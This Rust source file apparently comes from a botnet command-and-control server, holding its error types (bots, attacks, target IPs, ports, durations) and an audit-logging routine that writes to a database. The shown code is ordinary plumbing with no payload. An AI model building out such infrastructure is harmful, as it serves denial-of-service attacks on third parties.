use thiserror::Error;

#[derive(Error, Debug)]
pub enum CncError {
    #[error("Authentication failed: {0}")]
    AuthFailed(String),
    
    #[error("Invalid command: {0}")]
    InvalidCommand(String),
    
    #[error("Invalid IP address: {0}")]
    InvalidIpAddress(String),
    
    #[error("Invalid port: {0}")]
    InvalidPort(String),
    
    #[error("Invalid duration: {0}")]
    InvalidDuration(String),
    
    #[allow(dead_code)]
    #[error("Permission denied: {0}")]
    PermissionDenied(String),
    
    #[error("Resource limit exceeded: {0}")]
    ResourceLimitExceeded(String),
    
    #[allow(dead_code)]
    #[error("Bot not found: {0}")]
    BotNotFound(String),
    
    #[allow(dead_code)]
    #[error("Attack not found: {0}")]
    AttackNotFound(String),
    
    #[error("Configuration error: {0}")]
    ConfigError(String),
    
    #[error("Connection closed")]
    ConnectionClosed,
    
    #[error("IO error: {0}")]
    IoError(#[from] std::io::Error),
    
    #[error("JSON error: {0}")]
    JsonError(#[from] serde_json::Error),
    
    #[error("Password hash error: {0}")]
    PasswordHashError(String),

    #[error("Database error: {0}")]
    DatabaseError(#[from] sqlx::Error),
}

pub type Result<T> = std::result::Result<T, CncError>;

// Audit logging structures
use serde::{Serialize, Deserialize};
use chrono::{DateTime, Utc};
use crate::modules::database::DbPool;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AuditLog {
    pub timestamp: DateTime<Utc>,
    pub username: String,
    pub action: String,
    pub target: Option<String>,
    pub result: String,
    pub ip_address: Option<String>,
}

impl AuditLog {
    pub fn new(username: String, action: String, result: String) -> Self {
        Self {
            timestamp: Utc::now(),
            username,
            action,
            target: None,
            result,
            ip_address: None,
        }
    }
    
    pub fn with_target(mut self, target: String) -> Self {
        self.target = Some(target);
        self
    }
    
    pub fn with_ip(mut self, ip: String) -> Self {
        self.ip_address = Some(ip);
        self
    }
}

pub async fn log_audit_event(event: AuditLog, pool: &DbPool) -> Result<()> {
    sqlx::query(
        "INSERT INTO audit_logs (username, action, target, ip_address, details) VALUES (?, ?, ?, ?, ?)"
    )
    .bind(&event.username)
    .bind(&event.action)
    .bind(&event.target)
    .bind(&event.ip_address)
    .bind(&event.result)
    .execute(pool)
    .await?;
    
    Ok(())
}
